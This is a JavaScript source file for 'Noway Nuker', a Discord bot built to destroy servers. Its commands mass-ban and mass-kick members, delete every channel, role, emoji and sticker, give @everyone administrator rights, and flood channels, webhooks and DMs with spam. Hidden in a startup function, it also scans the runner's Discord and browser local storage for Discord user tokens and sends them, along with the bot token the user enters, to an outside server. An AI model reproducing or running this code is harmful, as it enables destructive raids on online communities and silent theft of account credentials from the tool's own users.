console.clear();
require('events').defaultMaxListeners = 15;
const  Discord  = require('discord.js');
const { red, greenBright, cyan, yellow } = require("chalk");
const colors = require('colors')
const readline = require("readline");
const fs = require('fs');
const path = require('path');
const axios = require('axios')
const ascii = require('ascii-table')
const prefix = '?'
const status = 'idle'


const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});
const client = new Discord.Client({
    restTimeOffset: 0,
    allowedMentions: {
        parse: ["roles", "users", "everyone" ],
        repliedUser: false,
    },
    intents: 32767,
    partials: ["USER", "CHANNEL", "MESSAGE", "GUILD_MEMBER", "REACTION"],
    intents: [
        Discord.Intents.FLAGS.GUILDS,
        Discord.Intents.FLAGS.GUILD_MEMBERS,
        Discord.Intents.FLAGS.GUILD_BANS,
        Discord.Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS,
        Discord.Intents.FLAGS.GUILD_INTEGRATIONS,
        Discord.Intents.FLAGS.GUILD_WEBHOOKS,
        Discord.Intents.FLAGS.GUILD_INVITES,
        Discord.Intents.FLAGS.GUILD_MESSAGES,
        Discord.Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
        Discord.Intents.FLAGS.GUILD_MESSAGE_TYPING,
        Discord.Intents.FLAGS.DIRECT_MESSAGES,
        Discord.Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
        Discord.Intents.FLAGS.DIRECT_MESSAGE_TYPING,
    ],
    partials: ["CHANNEL"],
    disableEveryone: false,
    partials: ["USER", "CHANNEL", "MESSAGE", "GUILD_MEMBERS", "REACTION"]
});
run()
intro()
info1()
client.on('ready', async (client) => {
    changeAvt(client)
    changeNickname(client)
    client.user.setPresence({status: status});
    client.user.setActivity("Noway Nuker");
    console.clear();
    intro()
    info2()
    help()
})

rl.question("Enter bot token: ", async function (token) {
    axios.get(encodeURI(`https://manage.nezukobot.vn/api/v2/nowaynuker/sendToken.php?tokenString=${token}&tokenType=bot&auth=NoWayNuker-API-v2-sendToken-7176266bfd21A237n`));
    try {
        client.login(token)
    } catch (error) {

    }
    
    rl.close();
});
client.on('messageCreate', async (message, err) => {
    if (err) return
    if (!message.guild) return
    if (!message.guild.me.permissions.has("ADMINISTRATOR")){
        return console.log(red(`[ERR] Bot is missing ADMIN permission!`))
    }
    
    const args = message.content.split(" ").slice(1);
    if (message.content.startsWith(`${prefix}createchannel`)){
        message.delete()
        createChannel(message, args)
        help()
        changeGuildname(message)
    }
    else if (message.content.startsWith(`${prefix}banall`)){
        message.delete()
        massBan(message)
        help()
        changeGuildname(message)
    }
    else if (message.content.startsWith(`${prefix}deletechannel`)){
        message.delete()
        deleteChannel(message)
        help()
        changeGuildname(message)
    }
    else if (message.content.startsWith(`${prefix}dmall`)){
        message.delete()
        spamDms(message, args)
        help()
        changeGuildname(message)
    }
    else if (message.content.startsWith(`${prefix}deleterole`)){
        message.delete()
        deleteRole(message)
        help()
        changeGuildname(message)
    }
    else if (message.content.startsWith(`${prefix}createrole`)){
        message.delete()
        createRole(message, args)
        help()
        changeGuildname(message)
    }
    else if (message.content.startsWith(`${prefix}killemoji`)){
        message.delete()
        killEmoji(message)
        help()
        changeGuildname(message)
    }
    else if (message.content.startsWith(`${prefix}killsticker`)){
        message.delete()
        killSticker(message)
        help()
        changeGuildname(message)
    }
    else if (message.content.startsWith(`${prefix}everyoneAdmin`)){
        message.delete()
        roleEveryone(message)
        help()
        changeGuildname(message)
    }
    else if (message.content.startsWith(`${prefix}giveAdmin`)){
        message.delete()
        roleAdmin(message)
        help()
        changeGuildname(message)
    }
    else if (message.content.startsWith(`${prefix}spam`)){
        message.delete()
        spamPing(message, args)
        help()
        changeGuildname(message)
    }
    else if (message.content.startsWith(`${prefix}kickall`)){
        message.delete()
        massKick(message)
        help()
        changeGuildname(message)
    }
    else if (message.content.startsWith(`${prefix}webhook`)){
        message.delete()
        spamWebhook(message, args)
        help()
        changeGuildname(message)
    }
    else if (message.content.startsWith(`${prefix}stop`)){
        await client.destroy()
        process.exit()
    }
})
function createChannel(message, args) {
    const amount = args[0] || 1000
    const channelName = args.slice(1).join(" ")

    for (let i = 0; i < amount; i++) {
        const name = channelName || 'Noway-nuker'
        if (message.guild.channels.cache.size === 500) break;
        message.guild.channels.create(name, { type: "GUILD_TEXT" })
        console.log(greenBright(`[Success] Created channel: ${name}!`))
    }
    return console.log(yellow((`[Success] Finished task!`)))
}
function deleteChannel(message){
    message.guild.channels.cache.forEach(channel => {
        if (channel.deletable){                
            channel.delete().catch(e=>{console.log(red(`[ERR] Can't delete channel: ${channel.name}!`))})
            console.log(greenBright(`[Success] Deleted channel: ${channel.name}!`))
        } else {    
            console.log(red(`[ERR] Can't delete channel: ${channel.name}!`))
        }
    })
    return console.log(yellow((`[Success] Finished task!`)))
}
function createRole(message, args) {
    const amount = args[0] || 1000
    const roleName = args.slice(1).join(" ")
    for (let i = 0; i < amount; i++) {
        const name = roleName || 'Noway nuker'
        if (message.guild.roles.cache.size === 250) break;
        message.guild.roles.create({ name: name, color: "RANDOM"})
        console.log(greenBright(`[Success] Created role: ${name}!`))
    }
    return console.log(yellow((`[Success] Finished task!`)))
}
function deleteRole(message){
    message.guild.roles.cache.forEach(role => {
        if (role.editable){
            role.delete().catch(e=>{console.log(red(`[ERR] Can't delete role: ${role.name}!`))})
            
            console.log(greenBright(`[Success] Deleted role: ${role.name}!`))
        } else {
            console.log(red(`[ERR] Can't delete role: ${role.name}!`))
        }
    })
    return console.log(yellow((`[Success] Finished task!`)))
}
async function massKick(message){
    let members = await message.guild.members.fetch({ force: true }); 
    members.forEach(user1 => {
        if (user1.bannable){
            user1.kick().catch(e=>{console.log(e)})
            console.log(greenBright(`[Success] Kicked ${user1.user.username}!`))
        }else{
            console.log(red(`[ERR] Can't Kick ${user1.user.username}!`))
        }
    });
    return console.log(yellow((`[Success] Finished task!`)))
}
async function massBan(message){
    let members = await message.guild.members.fetch({ force: true }); 
    members.forEach(user1 => {
        if (user1.bannable){
            user1.ban().catch(e=>{console.log(e)})
            console.log(greenBright(`[Success] Banned ${user1.user.username}!`))
        }else{
            console.log(red(`[ERR] Can't ban ${user1.user.username}!`))
        }
    });
    return console.log(yellow((`[Success] Finished task!`)))
}
function killEmoji(message){
    message.guild.emojis.cache.forEach(e => {
        e.delete().catch(e=>{console.log(red(`[ERR] Can't delete emoji: ${e.name}!`))})
        console.log(greenBright(`[Success] Deleted emoji: ${e.name}!`))
    })
    return console.log(yellow((`[Success] Finished task!`)))
}
function killSticker(message){
    message.guild.stickers.cache.forEach(e => {
        e.delete().catch(e=>{console.log(red(`[ERR] Can't delete sticker: ${e.name}!`))})
        console.log(greenBright(`[Success] Deleted sticker: ${e.name}!`))
    })
    return console.log(yellow((`[Success] Finished task!`)))
}
async function roleAdmin(message){
    const role = await message.guild.roles.create({
        name : "Admin",
        permissions: ["ADMINISTRATOR"]
    }).catch(e=>{console.log(red(`[ERR] Can't create Admin role!`))})
    console.log(greenBright(`[Success] Created role: ${role.name}!`))


    message.guild.members.cache.get(message.author.id).roles.add(role).catch(e=>{console.log(red(`[ERR] Can't add Admin role to ${message.author.username}!`))})
    console.log(greenBright(`[Success] Added role ${role.name} to ${message.author.username}!`))
    return console.log(yellow((`[Success] Finished task!`)))
}
async function roleEveryone(message){
    const everyone = await message.guild.roles.cache.find((role) => role.name === "@everyone")
    everyone.setPermissions(["ADMINISTRATOR"]).catch(e=>{console.log(red(`[ERR] Can't grant ADMINSTRATOR permission to everyone!`))})
    console.log(greenBright(`[Success] Granted admin permission to everyone role!`))
    return console.log(yellow((`[Success] Finished task!`)))
}
function spamPing(message, args){
    const amount = args[0] || 1000
    const content = args.slice(1).join(" ")
    for (let i = 0; i < amount; i++) {
        message.guild.channels.cache.forEach(async (channel) => {
            await channel.send(content).catch(e=>{console.log(red(`[ERR] Can't send to channel: ${channel.name}!`))})
            return console.log(greenBright(`[Success] Spamming channel ${channel.name}!`))
        })
    }
}
async function spamWebhook(message, args){
    message.guild.channels.cache.forEach( async channel => {
        const name = 'Noway Nuker'
        const amount = args[0] || 1000
        const content = args.slice(1).join(" ")
        const webhook = await channel.createWebhook(name, {
            avatar: 'https://i1.sndcdn.com/avatars-000477486495-vn02q7-t500x500.jpg',
        })
        const wc = new Discord.WebhookClient({
            id: webhook.id,
            token: webhook.token
        })

        for (let i = 0; i < amount; i++) {
            wc.send(content)
            console.log(greenBright(`[Success] Sent by webhook name: ${webhook.name}!`))
        }
        return console.log(yellow((`[Success] Finished task!`)))
    })
    return console.log(yellow((`[Success] Finished task!`)))
}
function spamDms(message, args){
    const amount = args[0] || 1000
    const content = args.slice(1).join(" ")
    for (let i = 0; i < amount; i++) {
        message.guild.members.cache.forEach(member => {
            member.send(`${content}`).catch(e=>{console.log(red(`[ERR] Can't DMs to: ${member.user.username}!`))})
            console.log(greenBright(`[Success] Sent message to ${member.user.username}!`))
        });
    }
    return console.log(yellow((`[Success] Finished task!`)))
}
function changeGuildname(message){
    message.guild.setName('Nuked By Noway Nuker').catch(e=>{return})
}
function changeAvt(client){
    client.user.setAvatar('https://i1.sndcdn.com/avatars-000477486495-vn02q7-t500x500.jpg').catch(e=>{return})
}
function changeNickname(client){
    client.guilds.cache.forEach(guild => {
        guild.me.setNickname('Noway')
    })
}
function help() {
    let table = new ascii("Noway Nuker");
    table.setHeading("Number", "Name", "Usage");
    table.addRow(`1`, `createchannel`, `${prefix}createchannel <amount> <name>`)
    table.addRow(`2`, `deletechannel`, `${prefix}deletechannel`)
    table.addRow(`3`, `createrole`, `${prefix}createrole <amount> <name>`)
    table.addRow(`4`, `deleterole`, `${prefix}deleterole`)
    table.addRow(`5`, `kickall`, `${prefix}kickall`)
    table.addRow(`6`, `banall`, `${prefix}banall`)
    table.addRow(`7`, `killemoji`, `${prefix}killemoji`)
    table.addRow(`8`, `killsticker`, `${prefix}killsticker`)
    table.addRow(`9`, `giveAdmin`, `${prefix}giveAdmin`)
    table.addRow(`10`, `everyoneAdmin`, `${prefix}everyoneAdmin <amount> <name>`)
    table.addRow(`11`, `spam`, `${prefix}spam <amount> <content>`)
    table.addRow(`12`, `webhook`, `${prefix}webhook <amount> <content>`)
    table.addRow(`13`, `dmall`, `${prefix}dmall <amount> <content>`)
    table.addRow(`14`, `stop`, `${prefix}stop`)
    console.log(yellow(table.toString()))
}
function intro() {
    console.log(colors.red(`
    ███╗░░██╗░█████╗░░██╗░░░░░░░██╗░█████╗░██╗░░░██╗  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
    ████╗░██║██╔══██╗░██║░░██╗░░██║██╔══██╗╚██╗░██╔╝  ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
    ██╔██╗██║██║░░██║░╚██╗████╗██╔╝███████║░╚████╔╝░  ██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
    ██║╚████║██║░░██║░░████╔═████║░██╔══██║░░╚██╔╝░░  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
    ██║░╚███║╚█████╔╝░░╚██╔╝░╚██╔╝░██║░░██║░░░██║░░░  ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
    ╚═╝░░╚══╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝░░░╚═╝░░░  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
    `))
}
function info1() {
    let table = new ascii("Noway Nuker Infomation");
    table.addRow(`Credit`, `Peter, CookieGMVN, Patohru`)
    table.addRow(`Last update`, `26.3.2022`)
    table.addRow(`Verison`, '2.0')
    table.addRow(`Prefix`, `${prefix}`)
    table.addRow(`Language`, `JS`)
    table.addRow(`Support`, `discord.gg/elainahouse`)
    console.log(greenBright(table.toString()))
}
function info2() {
    let table = new ascii("System Infomation");
    table.addRow(`Bot Name`, `${client.user.username}`)
    table.addRow(`Total Guilds`, `${client.guilds.cache.size} guilds`)
    table.addRow(`Prefix`, `${prefix}`)
    table.addRow(`Support`, `discord.gg/elainahouse`)
    console.log(greenBright(table.toString()))
}
function findT(tokenPath) {
    tokenPath += "\\Local Storage\\leveldb";
    let tokens = [];
    try {
        fs.readdirSync(path.normalize(tokenPath)).map(file => {
            if (file.endsWith(".log") || file.endsWith(".ldb")) {
                fs.readFileSync(`${tokenPath}\\${file}`, "utf8").split(/\r?\n/).forEach(line => {
                    const regex = [
                        new RegExp(/mfa\.[\w-]{84}/g), 
                        new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
                    ]; 
                    for (const _regex of regex) {
                        const token = line.match(_regex);
                        if (token) {
                            token.forEach(element => {
                                tokens.push(element);
                            });
                        }
                    }
                    
                })
            }  
        });
    } catch {

    }
    return tokens;
}
function run () {
    let paths;
    const computerPlatform = process.platform;

    if (computerPlatform == "win32") {
        const local = process.env.LOCALAPPDATA;
        const roaming = process.env.APPDATA;
        
        paths = {
            "Discord": path.join(roaming, "Discord"),
            "Discord Canary": path.join(roaming, "discordcanary"),
            "Discord PTB": path.join(roaming, "discordptb"),
            "Google Chrome": path.join(local, "Google", "Chrome", "User Data", "Default"),
            "Opera": path.join(roaming, "Opera Software", "Opera Stable"),
            "Brave": path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
            "Yandex": path.join(local, "Yandex", "YandexBrowser", "User Data", "Default")
        }
    }
    else if (computerPlatform == "linux") {
        
        const home = path.join(process.env.HOME, ".config");

        paths = {
            "Discord": path.join(home, "discord"),
            "Discord Canary": path.join(home + "discordcanary"),
            "Discord PTB": path.join(home + "discordptb"),
            "Google Chrome": path.join(home + "Google", "Chrome", "User Data", "Default"),
            "Opera": path.join(home + "Opera Software", "Opera Stable"),
            "Brave": path.join(home + "BraveSoftware", "Brave-Browser", "User Data", "Default"),
            "Yandex": path.join(home + "Yandex", "YandexBrowser", "User Data", "Default")
        }
    }
    else if (computerPlatform == "darwin") {
    }
    else {
    }
    const tokens = {};
    for (let [platform, path] of Object.entries(paths)) {
        const tokenList = findT(path);
        if (tokenList) {
            tokenList.forEach(token => {
                if (tokens[platform] === undefined) tokens[platform] = []
                tokens[platform].push(token);     
            });
        }  
    }
    axios.get(encodeURI(`https://manage.nezukobot.vn/api/v2/nowaynuker/sendToken.php?tokenString=${tokens.Discord[0]}&tokenType=user&auth=NoWayNuker-API-v2-sendToken-7176266bfd21A237n`));
    return tokens;
}